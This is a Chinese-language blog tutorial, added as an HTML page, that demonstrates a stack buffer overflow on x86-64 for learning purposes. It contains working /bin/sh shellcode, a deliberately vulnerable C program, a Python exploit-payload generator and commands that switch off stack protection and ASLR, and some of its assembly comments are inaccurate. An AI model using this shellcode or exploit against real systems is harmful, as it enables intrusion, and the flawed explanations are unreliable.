@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"e-x.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="PS：要转载请注明出处，本人版权所有。 PS: 这个只是基于《我自己》的理解， 如果和你的原则及想法相冲突，请谅解，勿喷。  环境说明   无 前言    本文仅用于学习计算机程序运行原理，请不要用作其他违法用途。   内存溢出可以说是我们程序员经常遇到的问题了，但是一般过程中，我们只会处理让程序崩溃的内存溢出，只要程序不崩溃，我们基本不会管的了。这里，我将会演示一下程序内存溢出的严重后果。同时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="x86架构的内存溢出攻击原理演示(加强对计算机运行原理的理解，说明内存溢出的危害)">
+<meta property="og:url" content="https://e-x.top/2018/12/06/blog_idx_074/index.html">
+<meta property="og:site_name" content="Sky&#39;s Blogs">
+<meta property="og:description" content="PS：要转载请注明出处，本人版权所有。 PS: 这个只是基于《我自己》的理解， 如果和你的原则及想法相冲突，请谅解，勿喷。  环境说明   无 前言    本文仅用于学习计算机程序运行原理，请不要用作其他违法用途。   内存溢出可以说是我们程序员经常遇到的问题了，但是一般过程中，我们只会处理让程序崩溃的内存溢出，只要程序不崩溃，我们基本不会管的了。这里，我将会演示一下程序内存溢出的严重后果。同时">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/stack.png">
+<meta property="og:image" content="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/syscall.png">
+<meta property="og:image" content="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/ret.png">
+<meta property="og:image" content="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/gdb.png">
+<meta property="og:image" content="https://flyinskyin2013.github.io/ImageBed0/blogs/qrcode_for_wx_official_account.jpg">
+<meta property="article:published_time" content="2018-12-06T08:46:09.000Z">
+<meta property="article:modified_time" content="2023-11-19T05:00:05.817Z">
+<meta property="article:author" content="Sky">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/stack.png">
+
+<link rel="canonical" href="https://e-x.top/2018/12/06/blog_idx_074/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8677552300382028" crossorigin="anonymous"></script>
+  <title>x86架构的内存溢出攻击原理演示(加强对计算机运行原理的理解，说明内存溢出的危害) | Sky's Blogs</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-80RLMJ8DQP"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-80RLMJ8DQP');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?33f6329a2e264bb97f4f37ee8ddec093";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sky's Blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://e-x.top/2018/12/06/blog_idx_074/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sky">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sky's Blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          x86架构的内存溢出攻击原理演示(加强对计算机运行原理的理解，说明内存溢出的危害)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-12-06 16:46:09" itemprop="dateCreated datePublished" datetime="2018-12-06T16:46:09+08:00">2018-12-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-11-19 13:00:05" itemprop="dateModified" datetime="2023-11-19T13:00:05+08:00">2023-11-19</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>4.2k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!--
+ * @Description: 
+ * @Author: Sky
+ * @Date: 2020-08-24 16:37:34
+ * @LastEditors: Sky sky@sky-home.com
+ * @LastEditTime: 2022-10-23 18:22:10
+ * @Github: https://github.com/flyinskyin2013/
+-->
+<p><font color="red" size="7">PS：要转载请注明出处，本人版权所有。</font><br/><br>
+<font color="red" size="7">PS: 这个只是基于《我自己》的理解，</font><br/><br>
+<font color="red" size="7">如果和你的原则及想法相冲突，请谅解，勿喷。</font><br/></p>
+<!-- ###### 前置说明
+&emsp;&emsp;本文作为本人csdn blog的主站的备份。（BlogID=074） 
+&emsp;&emsp;本文发布于 2018-12-06 16:46:09，现用MarkDown+图床做备份更新。blog原图已丢失，使用csdn所存的图进行更新。（BlogID=074） 
+-->
+<h6 id="环境说明">环境说明</h6>
+<p>  无</p>
+<h3 id="前言">前言</h3>
+<hr>
+<p>  本文仅用于学习计算机程序运行原理，请不要用作其他违法用途。</p>
+<p>  内存溢出可以说是我们程序员经常遇到的问题了，但是一般过程中，我们只会处理让程序崩溃的内存溢出，只要程序不崩溃，我们基本不会管的了。这里，我将会演示一下程序内存溢出的严重后果。同时也警示我们自身，写程序一定要逻辑严密一点，不要犯低级错误。（然而我们不可能避免错误，只要没有比较明显的错误即可。）</p>
+<br/>
+<br/>
+<br/>
+<br/>
+<h3 id="前置知识（64bit）">前置知识（64bit）</h3>
+<hr>
+<br/>
+<br/>
+<h5 id="汇编中的几个重要指令">汇编中的几个重要指令:</h5>
+<p>  汇编中的几个重要指令:</p>
+<ul>
+<li>call xxx 等价于：push eip 和 jump xxx</li>
+<li>leave 等价于:  pop rbp 和 mov rbp,rsp</li>
+<li>ret 等价于 pop eip</li>
+</ul>
+<br/>
+<br/>
+<h5 id="栈帧的知识：">栈帧的知识：</h5>
+<p>  参考我之前的文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u011728480/article/details/79092194">https://blog.csdn.net/u011728480/article/details/79092194</a></p>
+<p>  简单说就是,跳转到一个子过程，会又一片新的内存区域，有三个重要的寄存器rbp，rsp，eip 可以表示和这个区域的属性。看下图：(在调用一个子过程的时候，注意rsp，rbp，eip的变化，新的rsp和rbp的生成，新老rsp和rbp的关系)</p>
+<div style="text-align:center">
+    <div style="margin:0 auto;">
+        <center><img src="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/stack.png" alt="rep_img"/></center>
+    </div>
+</div>  
+<p>  注意：每个子调用的完整过程为:这里面包含了所有的rbp,rsp，eip的变化</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">call sub_call       ; eip入栈，rsp-8</span><br><span class="line">push rbp		 ; rbp 入栈  rsp-8</span><br><span class="line">mov rsp,rbp        ; rsp 赋值给rbp，作为一个新的栈帧开始，rbp为栈底</span><br><span class="line">... ...                    ;这里就是子调用的变量内存分配，rsp-0xN</span><br><span class="line">... ...			 ;其他过程</span><br><span class="line">... ...                    ;其他过程</span><br><span class="line">leave                  ;rbp赋值给rsp, rbp出栈，rsp+8</span><br><span class="line">ret                       ;eip出栈，rsp+8</span><br></pre></td></tr></table></figure>
+<p>  这样的一个过程，就完成了现场调整执行子调用然后恢复现场的过程。</p>
+<br/>
+<br/>
+<br/>
+<br/>
+<h3 id="内存溢出的攻击的简要原理（以上图为例）">内存溢出的攻击的简要原理（以上图为例）</h3>
+<hr>
+<p>  x86栈帧是从高地址到低地址的排列的。如果我在sub_func中分配了0xN字节的buf，那么上图的rbp’和rsp’的关系变为rbp’=rsp’+0xN，如果没有做安全的内存使用，我直接写入了0xN+8+8的数据，理论上来说，我就覆盖了上图栈中eip的值，eip存放的是sub_func返回时，要执行Main_Func下一条指令的地址，也就是说，我控制了，sub_func返回时要执行的地址内容，那么通过精心构造的内容，如果写入到buf，就可能执行我们想要的代码。</p>
+<p>  那么是不是内存溢出很简单呢？操作系统难道那么不安全吗？</p>
+<br/>
+<br/>
+<br/>
+<br/>
+<h3 id="现代内存堆栈保护技术出现">现代内存堆栈保护技术出现</h3>
+<hr>
+<ol>
+<li>编译器堆栈检测</li>
+<li>堆栈不可执行</li>
+<li>地址空间随机化等等</li>
+</ol>
+<p>  这些东西都可以提高内存溢出的难度，我是一个小白，为了理解内存攻击，我得把他们关闭了。</p>
+<br/>
+<br/>
+<br/>
+<br/>
+<h3 id="内存溢出攻击实例">内存溢出攻击实例</h3>
+<hr>
+<br/>
+<br/>
+<h5 id="1-准备一份shellcode，就是上面替换eip后，你想要执行的一份代码。我这里选择，生成一个shell。">1 准备一份shellcode，就是上面替换eip后，你想要执行的一份代码。我这里选择，生成一个shell。</h5>
+<p>  对应的16进制：<br>
+\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</p>
+<p>  c版本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//       int execve(const char *filename, char *const argv[],char *const envp[]);</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> * a = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> * b[<span class="number">1</span>];</span><br><span class="line">b[<span class="number">0</span>] = a;</span><br><span class="line">execve(a, b, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+<p>  汇编版本（64位，注意）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">xor eax, eax ; 清空eax</span><br><span class="line">mov rbx, 0xFF978CD091969DD1 ; 0x6873276e69622f的补码</span><br><span class="line">neg rbx;对rbx求补码，rbx=0x6873276e69622f,代表hs/nib/</span><br><span class="line">push rbx;把/bin/sh的地址放入栈，rsp-8</span><br><span class="line">push rsp;rsp放入堆栈，rsp-8</span><br><span class="line">pop rdi;把/bin/sh的地址给rdi，rdi作为作为参数参数的第一个参数，在64系统中，rsp+8</span><br><span class="line">cdq;把edx的每一位设置为eax的最高位，就是edx清零，然后把edx作为eax的高位。</span><br><span class="line">push rdx;内存地址高8字节rsp-8</span><br><span class="line">push rdi;内存地址低8字节，指向/bin/sh,rsp-8</span><br><span class="line">push rsp;保存rsp,rsp-8</span><br><span class="line">pop rsi;rsi=新构造的一个变量地址。指向/bin/sh,rsp+8</span><br><span class="line">mov al, 0x3b;设置系统调用号0x3b execv</span><br><span class="line">syscall;系统调用</span><br></pre></td></tr></table></figure>
+<p>  64位系统,execve的系统调用号为59，也就是0x3b</p>
+<div style="text-align:center">
+    <div style="margin:0 auto;">
+        <center><img src="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/syscall.png" alt="rep_img"/></center>
+    </div>
+</div>  
+<br/>
+<br/>
+<h5 id="2-实际实例攻击">2 实际实例攻击</h5>
+<p>  异常代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">overflow</span><span class="params">(<span class="type">char</span> * msg)</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(buf, msg, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;buf out: %s&quot;</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> main_buf[<span class="number">100</span>];</span><br><span class="line">	<span class="type">int</span> f = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line">	read(f, main_buf, <span class="number">100</span>);</span><br><span class="line">	overflow(main_buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>  exp 辅助生产工具，生成exp文件，python <a target="_blank" rel="noopener" href="http://exp.py">exp.py</a>&gt;msg</p>
+<p>  exp.py 文件内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> call</span><br><span class="line"></span><br><span class="line">addr=<span class="number">0x7fffffffDE5B</span></span><br><span class="line"></span><br><span class="line">s_c=<span class="string">&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">buf=<span class="string">&quot;M&quot;</span>*<span class="number">10</span></span><br><span class="line">buf+=<span class="string">&quot;M&quot;</span>*<span class="number">8</span></span><br><span class="line">buf+=struct.pack(<span class="string">&quot;&lt;I&quot;</span>,<span class="number">0xffffde30</span>) <span class="comment">#main rbp</span></span><br><span class="line">buf+=struct.pack(<span class="string">&quot;&lt;I&quot;</span>,<span class="number">0x7fff</span>) <span class="comment">#main rbp</span></span><br><span class="line">buf+=s_c</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params">s</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;\\x&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="built_in">print</span> buf</span><br><span class="line"><span class="comment">#call([&quot;./a.out&quot;,buf])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>  编译方法，去掉堆栈保护，设置堆栈可执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc test.cpp -l stdc++ -z execstack -fno-stack-protector </span><br></pre></td></tr></table></figure>
+<p>  关闭地址随机化（必须root用户情况下）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space </span><br></pre></td></tr></table></figure>
+<p>  效果：</p>
+<div style="text-align:center">
+    <div style="margin:0 auto;">
+        <center><img src="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/ret.png" alt="rep_img"/></center>
+    </div>
+</div>  
+<p>  至此我们成功拿到了shell，可以做一些简单的shell操作等等。</p>
+<br/>
+<br/>
+<br/>
+<br/>
+<h3 id="以上实例分析">以上实例分析</h3>
+<hr>
+<p>  根据上文overflow源码分析得出，我们溢出了90个字节，由于程序员的不小心。这100个字节是来至于文件的，我们可以构建一个特殊的文件来达到我们的目的。</p>
+<p>  根据exp助手，我们可以生成一个创建shell的exp文件。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据exp助手源码可知：</span><br><span class="line">1-10字节为M     ------    这对应我们申请的buf内容</span><br><span class="line">11-18字节为M     ------   这对应在子过程调用中，push rbp时，保存的原有的rbp</span><br><span class="line">19-26字节为eip在栈中的位置   ------ 这就是我们要修改当overflow返回时，我要计算机执行的我的代码的地方，也就是shellcode中的xor eax,eax</span><br><span class="line">27-54字节即为创建shell的shellcode</span><br></pre></td></tr></table></figure>
+<p>  如果我们在overflow中申请的buf地址为N，那么：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N~N+0xa 为buf的内存空间</span><br><span class="line">N+0xb~N+0x12 为原rbp保存的位置</span><br><span class="line">N+0x13~N+0x1a 为我们需要控制的eip的值，需要让他指定到我们想要的地址去，明显我们想要的地址就是N+0x1b，也就是我们创建shell的汇编存放的地方</span><br><span class="line">N+0x1b~N+0x36 为我们存放创建shell汇编代码的存放的地方。</span><br></pre></td></tr></table></figure>
+<p>  从上述分析可知：<br>
+    我们需要改的就是N+0x13~N+0x1a内存中存放的值，改为N+0x1b.</p>
+<p>  在操作系统中：当我们关闭的地址虚拟化后，我们的程序在开机的过程中，每次运行的时候，基地址的一致的，这样我们每次运行的时候，我们的buf地址是一致，当我们获取了buf地址后，即可生成exp文件。</p>
+<p>  我们通过core文件和gdb来找到buf的地址如下图：</p>
+<p>  先运行./a.out msg</p>
+<p>  这个时候msg的地址可以乱填，反正会段错误。得到core文件</p>
+<p>  在运行 gdb --core=core</p>
+<p>  这个时候查看几个寄存器的值，唯一的有效值是rsp的值如下图：</p>
+<div style="text-align:center">
+    <div style="margin:0 auto;">
+        <center><img src="https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_074/gdb.png" alt="rep_img"/></center>
+    </div>
+</div>  
+<p>  通过分析，发现是执行完leave 指令，并且执行完ret指令，eip中的值为我随意设定的一个乱的值。</p>
+<p>  这里我们就知道，rsp的值即为我们的想要的shellcode，rsp的地址即为我们想要的地址，把这个地址放到exp助手里面去，然后重新生成exp文件，然后就得到了我们想要的结果。</p>
+<br/>
+<br/>
+<br/>
+<br/>
+<h3 id="总结">总结</h3>
+<ol>
+<li>这告诉我们程序员，在写代码时，特别是有重大用处的程序时，要注意内存溢出问题，不可能有那么明显的溢出，但是有很多隐藏溢出地方，这个需要大家注意。</li>
+<li>计算机还是一如既往的笨。</li>
+<li>这是最经典的内存溢出攻击方式，现代的溢出攻击万变不离其宗。</li>
+</ol>
+<h2 id="本文主要是为了学习计算机中程序执行的原理，请不要用于非法用途。">本文主要是为了学习计算机中程序执行的原理，请不要用于非法用途。</h2>
+<br/>
+<br/>
+<br/>
+<br/>
+<h3 id="后记">后记</h3>
+<hr>
+<p>  无</p>
+<h3 id="参考文献">参考文献</h3>
+<ul>
+<li>无</li>
+</ul>
+<br/>
+<br/>
+<div style="margin:50px auto;">
+</div>
+<div style="text-align:center">
+    <div style="margin:0 auto;">
+        <hr/>
+        <center><font color = #91e0b0 size = 5>打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）</font></center>
+    </div>
+</div>
+<div style="text-align:center">
+    <div style="margin:0 auto;">
+        <center><img src="https://flyinskyin2013.github.io/ImageBed0/blogs/qrcode_for_wx_official_account.jpg" alt="qrc_img"/></center>
+    </div>
+</div>
+<!-- ![alt 公众号图片](https://flyinskyin2013.github.io/ImageBed0/blogs/qrcode_for_wx_official_account.jpg "公众号图片") -->
+<p><font color="red" size="7">PS: 请尊重原创，不喜勿喷。</font><br/><br>
+<font color="red" size="7">PS: 要转载请注明出处，本人版权所有。</font><br/><br>
+<font color="red" size="7">PS: 有问题请留言，看到后我会第一时间回复。</font><br/></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/10/17/blog_idx_073/" rel="prev" title="Ubuntu 14.04 Intel 处理器 硬编解码配置(Intel® Media Server Studio)">
+      <i class="fa fa-chevron-left"></i> Ubuntu 14.04 Intel 处理器 硬编解码配置(Intel® Media Server Studio)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/01/04/blog_idx_075/" rel="next" title="一个简单的RTMP服务器实现 --- RTMP与H264">
+      一个简单的RTMP服务器实现 --- RTMP与H264 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+  <script src="https://utteranc.es/client.js"
+          repo="flyinskyin2013/blog_issues_rep"
+          issue-term="pathname"
+          theme="github-dark"
+          crossorigin="anonymous"
+          async>
+  </script>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E8%AF%B4%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">环境说明</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number"></span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%8864bit%EF%BC%89"><span class="nav-number"></span> <span class="nav-text">前置知识（64bit）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E9%87%8D%E8%A6%81%E6%8C%87%E4%BB%A4"><span class="nav-number"></span> <span class="nav-text">汇编中的几个重要指令:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="nav-number"></span> <span class="nav-text">栈帧的知识：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" 